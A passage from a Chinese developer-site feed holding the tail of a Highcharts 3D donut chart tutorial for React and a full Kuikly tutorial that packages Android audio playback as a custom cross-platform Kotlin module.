    labelNameFontSize = <span class="hljs-number">12</span>,
    labelValueFontSize = <span class="hljs-number">12</span>,
  } = props || {};

  <span class="hljs-keyword">const</span> [minH, maxH] = sliceHeightRange || [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>];
  <span class="hljs-keyword">const</span> computedDepth = <span class="hljs-keyword">typeof</span> depth === <span class="hljs-string">'number'</span> ? depth : <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>((minH + maxH) / <span class="hljs-number">2</span>));

  <span class="hljs-keyword">const</span> seriesData = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> list = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dataList) ? dataList : [];
    <span class="hljs-keyword">return</span> list.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">any</span>, idx: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { name, value } = item || {};
      <span class="hljs-keyword">const</span> y = <span class="hljs-title class_">Number</span>(value) || <span class="hljs-number">0</span>;
      <span class="hljs-keyword">const</span> color = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(colors) &amp;&amp; colors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? colors[idx % colors.<span class="hljs-property">length</span>] : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">const</span> fillColor = color ? (<span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">color</span>?.(color)?.<span class="hljs-title function_">setOpacity</span>(sliceOpacity)?.<span class="hljs-property">get</span>?.() || color : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">return</span> fillColor ? { name, y, <span class="hljs-attr">color</span>: fillColor } : { name, y };
    });
  }, [dataList, colors, sliceOpacity]);

  <span class="hljs-keyword">const</span> options = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> nameStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelNameColor}</span>;font-size:<span class="hljs-subst">${labelNameFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">const</span> valueStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelValueColor}</span>;font-size:<span class="hljs-subst">${labelValueFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
      <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: title, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> },
      <span class="hljs-attr">legend</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">layout</span>: <span class="hljs-string">'horizontal'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'bottom'</span> },
      <span class="hljs-attr">credits</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">false</span> },
      <span class="hljs-attr">tooltip</span>: { <span class="hljs-attr">headerFormat</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">pointFormat</span>: <span class="hljs-string">'{point.name}: &lt;b&gt;{point.y}元&lt;/b&gt;'</span> },
      <span class="hljs-attr">plotOptions</span>: {
        <span class="hljs-attr">pie</span>: {
          innerSize,
          <span class="hljs-attr">depth</span>: computedDepth,
          <span class="hljs-attr">allowPointSelect</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">softConnector</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">showInLegend</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">dataLabels</span>: {
            <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">useHTML</span>: labelUseHTML,
            <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
              <span class="hljs-keyword">const</span> <span class="hljs-attr">p</span>: <span class="hljs-built_in">any</span> = (<span class="hljs-variable language_">this</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">point</span> || {};
              <span class="hljs-keyword">const</span> n = p.<span class="hljs-property">name</span> ?? <span class="hljs-string">''</span>;
              <span class="hljs-keyword">const</span> y = <span class="hljs-keyword">typeof</span> p.<span class="hljs-property">y</span> === <span class="hljs-string">'number'</span> ? p.<span class="hljs-property">y</span> : <span class="hljs-title class_">Number</span>(p.<span class="hljs-property">y</span>) || <span class="hljs-number">0</span>;
              <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;div&gt;&lt;div style="<span class="hljs-subst">${nameStyle}</span>"&gt;<span class="hljs-subst">${n}</span>&lt;/div&gt;&lt;div style="<span class="hljs-subst">${valueStyle}</span>"&gt;<span class="hljs-subst">${y}</span>元&lt;/div&gt;&lt;/div&gt;`</span>;
            },
            <span class="hljs-attr">style</span>: { <span class="hljs-attr">textOutline</span>: <span class="hljs-string">'none'</span> },
            <span class="hljs-attr">distance</span>: labelDistance,
            <span class="hljs-attr">crookDistance</span>: connectorCrookDistance,
            connectorColor,
            connectorWidth,
          },
        },
      },
      <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: seriesData, <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>], <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span> } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>],
    } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>;
  }, [title, innerSize, computedDepth, seriesData, labelUseHTML, labelNameColor, labelValueColor, labelNameFontSize, labelValueFontSize, labelDistance, connectorCrookDistance, connectorColor, connectorWidth]);

  <span class="hljs-keyword">const</span> chartInstanceRef = <span class="hljs-title class_">React</span>.<span class="hljs-property">useRef</span>&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; }
    chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(containerId, options);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; } };
  }, [containerId, options]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">{containerId}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%' }} /&gt;</span></span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HCDonut3DChart</span>;
</code></pre>
<blockquote>
<p>说明：示例中通过解构读取 <code>props</code>，并在必要处做数字归一化，减少不必要类型定义，贴近业务编程习惯。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">动态更新与最佳实践</h2>
<ul>
<li>更新数据：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: newData }] }, <span class="hljs-literal">false</span>);
chart.<span class="hljs-title function_">redraw</span>();
</code></pre>
<ul>
<li>更新样式（示例：调节两段引导线长度）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">plotOptions</span>: { <span class="hljs-attr">pie</span>: { <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">distance</span>: <span class="hljs-number">48</span>, <span class="hljs-attr">crookDistance</span>: <span class="hljs-string">'45%'</span> } } } });
</code></pre>
<ul>
<li>生命周期管理（React）：
<ul>
<li>在 <code>useEffect</code> 中创建与销毁；避免多实例与内存泄漏。</li>
<li>容器尺寸变化时调用 <code>chart.reflow()</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-14">踩坑与解决</h2>
<ul>
<li>图心偏移：明确设置 <code>series.center</code> 与 <code>series.size</code>，并在布局稳定后再初始化；改用原生 <code>Highcharts.chart</code> 可避免包装层带来的测量差异。</li>
<li>颜色不匹配：为数据点绑定颜色（而不是直接依赖 <code>options.colors</code>），以防主题覆盖或 <code>undefined</code> 导致第三方主题读取 <code>colors[0]</code> 报错。</li>
<li>标签拥挤：开启两段引导线并调节长度；小值可在 <code>formatter</code> 中阈值过滤。</li>
<li>3D 模块未初始化：必须 <code>highcharts3d(Highcharts)</code>，否则 <code>options3d</code> 不生效或报错。</li>
<li>类型不兼容：当 TS JSX 配置不一致时，使用 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 渲染。</li>
</ul>
<hr/>
<h2 data-id="heading-15">配置项速查（精选）</h2>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：启用 3D 与倾角。</li>
<li><code>plotOptions.pie.innerSize/depth</code>：环形内径与厚度。</li>
<li><code>plotOptions.pie.softConnector</code>：启用两段式引导线。</li>
<li><code>dataLabels.useHTML/formatter/style</code>：两行标签与样式；<code>textOutline: 'none'</code> 去描边更清晰。</li>
<li><code>dataLabels.distance/crookDistance</code>：两段线长度与拐点位置；<code>connectorColor/connectorWidth</code> 控线型。</li>
<li><code>series.center/size</code>：居中与自适应半径，强烈建议使用百分比字符串。</li>
<li><code>tooltip.pointFormat</code>：统一金额单位；结合格式化函数确保数值正确。</li>
</ul>
<hr/>
<h2 data-id="heading-16">案例分析：从需求到实现</h2>
<ul>
<li>需求：在“日前经济最优/微协同”页面展示“优化总成本组成”与“实际总成本组成”，标签两行显示（名称 + 金额），图例与颜色对齐，支持导入导出。</li>
<li>实现：
<ul>
<li>颜色映射固定三类（负荷/光伏/储能），为数据点绑定 <code>itemStyle.color</code>；</li>
<li>两段引导线：<code>distance=40</code>、<code>crookDistance='45%'</code>；</li>
<li>中心标题用 <code>useHTML</code> 输出，并拆解为两行（<code>总成本</code> 与金额 <code>--/xxx元</code>）；</li>
<li>动态数据更新时，销毁旧实例再创建，避免偏移与堆叠；</li>
<li>上传下载逻辑与图表刷新在 hook 中解耦，实现稳态渲染。</li>
</ul>
</li>
<li>效果：在不同数据规模与容器布局下，图心稳定、颜色一致、标签清晰，运营展示可读性显著提升。</li>
</ul>
<hr/>
<h2 data-id="heading-17">结语</h2>
<p>Highcharts 的 3D 环形图兼具表现力与稳定性。生产落地的关键在于：正确初始化 3D 模块、保证容器尺寸稳定、强制图心与半径、为数据点绑定颜色、合理管理生命周期与更新流程。结合本文的实战代码与优化建议，你可以快速在任意页面构建高质量的 3D Donut。进一步可尝试主题切换、渐变色、动效过渡以及与其他图表的联动，释放更多可视化潜力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly 基础之封装自定义音频播放模块]]></title>    <link>https://juejin.cn/post/7575488180981153792</link>    <guid>https://juejin.cn/post/7575488180981153792</guid>    <pubDate>2025-11-24T03:41:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981153792" data-draft-id="7575488180981071872" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly 基础之封装自定义音频播放模块"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T03:41:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly 基础之封装自定义音频播放模块
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:08.000Z" title="Mon Nov 24 2025 03:41:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第八篇：Kuikly基础之封装自定义模块（音频）</h2>
<p>之前为了让小青蛙能“呱”一声叫出来，我们走了条“野路子”：用一个看不见的<code>Video</code>组件来播放音频。虽然能用，但总感觉有点“名不正言不顺”，不够优雅，也埋下了隐患。</p>
<p>于是，我们决定对这个“野路子”进行改造，采用Kuikly的自定义模块机制，把它从一个“组件技巧”升级为一项独立的“模块能力”。整个过程不复杂，我们分三步走。</p>
<h3 data-id="heading-1">第一步：定义共享模块——AudioModule (shared)</h3>
<p>首先，在所有平台都能访问的<code>shared</code>端，我们定义一个<code>AudioModule</code>。它负责定义接口，比如“播放”或“停止”，但它自己不关心具体怎么实现。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: AudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.modules
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.module.Module
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.nvi.serialization.json.JSONObject

<span class="hljs-comment">/**
 * 音频模块的共享部分，定义了跨平台使用的接口。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioModule</span> : <span class="hljs-type">Module</span>() {
    <span class="hljs-comment">// 模块的唯一标识，平台端靠它来识别</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">moduleName</span><span class="hljs-params">()</span></span>: String { <span class="hljs-keyword">return</span> MODULE_NAME }

    <span class="hljs-comment">// 定义“播放”接口，通过 callNativeMethod 把任务派发给平台端</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">playAsset</span><span class="hljs-params">(assetPath: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">val</span> p = JSONObject(); p.put(<span class="hljs-string">"assetPath"</span>, assetPath)
        callNativeMethod(<span class="hljs-string">"playAsset"</span>, p, <span class="hljs-literal">null</span>)
    }

    <span class="hljs-comment">// 定义“停止”接口</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">stop</span><span class="hljs-params">()</span></span> { callNativeMethod(<span class="hljs-string">"stop"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>) }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 模块名，两端要保持一致，像一个约定好的暗号</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>定义好后，得让每个页面都能用上它。所以我们在<code>BasePager</code>里把它注册成一个外部模块。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: BasePager.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.modules.AudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createExternalModules</span><span class="hljs-params">()</span></span>: Map&lt;String, Module&gt;? {
    <span class="hljs-keyword">val</span> m = hashMapOf&lt;String, Module&gt;()
    m[BridgeModule.MODULE_NAME] = BridgeModule()
    <span class="hljs-comment">// 把我们的音频模块也加进去</span>
    m[AudioModule.MODULE_NAME] = AudioModule()
    <span class="hljs-keyword">return</span> m
}
</code></pre>
<h3 data-id="heading-2">第二步：提供安卓端实现——KRAudioModule (Android)</h3>
<p><code>shared</code>端定义了接口，我们还需要在平台端提供具体的实现。在安卓这边，我们创建了<code>KRAudioModule</code>。</p>
<p>它继承<code>KuiklyRenderBaseModule</code>，通过重写<code>call</code>方法来响应来自<code>shared</code>端的调用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KRAudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.module
<span class="hljs-keyword">import</span> android.media.MediaPlayer
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.render.android.export.KuiklyRenderBaseModule
<span class="hljs-comment">// ...</span>

<span class="hljs-comment">/**
 * 音频模块在安卓平台的具体实现。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">KRAudioModule</span> : <span class="hljs-type">KuiklyRenderBaseModule</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> player: MediaPlayer? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// 在这里接收并处理来自shared端的调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">call</span><span class="hljs-params">(method: <span class="hljs-type">String</span>, params: <span class="hljs-type">String</span>?, cb: <span class="hljs-type">KuiklyRenderCallback</span>?)</span></span>: Any? = <span class="hljs-keyword">when</span>(method){
        <span class="hljs-string">"playAsset"</span> -&gt; { <span class="hljs-comment">// 实现“播放”</span>
            <span class="hljs-keyword">val</span> path = JSONObject(params ?: <span class="hljs-string">"{}"</span>).optString(<span class="hljs-string">"assetPath"</span>)
            <span class="hljs-keyword">val</span> context = context ?: <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
            <span class="hljs-comment">// 下面就是安卓原生播放音频的逻辑了</span>
            <span class="hljs-keyword">val</span> afd = context.assets.openFd(path)
            <span class="hljs-keyword">val</span> mp = player ?: MediaPlayer().also { player = it }
            mp.reset()
            mp.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()
            mp.isLooping = <span class="hljs-literal">false</span>
            mp.prepare()
            mp.start()
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-string">"stop"</span> -&gt; { <span class="hljs-comment">// 实现“停止”</span>
            player?.let { <span class="hljs-keyword">if</span> (it.isPlaying) it.stop(); it.reset() }
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-literal">null</span>
    }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 同样的模块名，确保能和shared端对上</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>同样，这个实现也得在安卓项目里注册一下，这样系统才知道有这么个模块可用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KuiklyRenderActivity.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.module.KRAudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">registerExternalModule</span><span class="hljs-params">(kuiklyRenderExport: <span class="hljs-type">IKuiklyRenderExport</span>)</span></span> {
    <span class="hljs-comment">// ...</span>
    with(kuiklyRenderExport) {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-comment">// 在这里注册，告诉系统 HRAudioModule 这个名称由 KRAudioModule 来实现</span>
        moduleExport(KRAudioModule.MODULE_NAME) { KRAudioModule() }
    }
}
</code></pre>
<h3 data-id="heading-3">第三步：在页面中使用模块</h3>
<p>准备工作都做好了，现在回到我们的<code>FrogMainPage</code>，看看如何使用这个新模块。过程非常直接。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: FrogMainPage.kt</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-comment">// 声明一个变量来持有音频模块的实例</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> audioModule: AudioModule

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        <span class="hljs-comment">// 页面创建时，通过 acquireModule 获取模块实例</span>
        audioModule = acquireModule&lt;AudioModule&gt;(AudioModule.MODULE_NAME)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-comment">// ...</span>
        event {
            click {
                <span class="hljs-comment">// ...</span>
                <span class="hljs-comment">// 点击时，直接调用模块的接口</span>
                audioModule.playAsset(<span class="hljs-string">"audio/frog_sound.mp3"</span>)
            }
        }
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>现在，页面逻辑变得清爽多了。没有了隐藏的<code>Video</code>和复杂的<code>playControl</code>，只剩下一句清晰的方法调用。</p>
<h3 data-id="heading-4">小结：从“野路子”到“正规军”</h3>
<p>这次重构，我们把音频播放从一个依赖UI组件的“野路子”，转变成了一个独立的、平台无关的“模块能力”。这不仅仅是代码写法的改变，更是一种架构思维的进步。</p>
<ul>
<li><strong>职责更清晰</strong>：<code>shared</code>端定义能力，<code>platform</code>端负责实现，页面只管使用。</li>
<li><strong>代码更干净</strong>：页面不再关心音频是怎么播放的，耦合度大大降低。</li>
<li><strong>扩展性更强</strong>：未来想增加预加载、管理多个音效，都只需要在模块内部做文章，页面代码基本不用动。</li>
</ul>
<p>现在，我们项目里那声清脆的“呱”，背后有了一个更稳固的实现方式。感觉好多了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI运动小程序鸿蒙平台适配指南]]></title>    <link>https://juejin.cn/post/7575748159608635418</link>    <guid>https://juejin.cn/post/7575748159608635418</guid>    <pubDate>2025-11-24T04:03:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575748159608635418" data-draft-id="7575533124878778395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI运动小程序鸿蒙平台适配指南"/> <meta itemprop="keywords" content="JavaScript"/> <meta 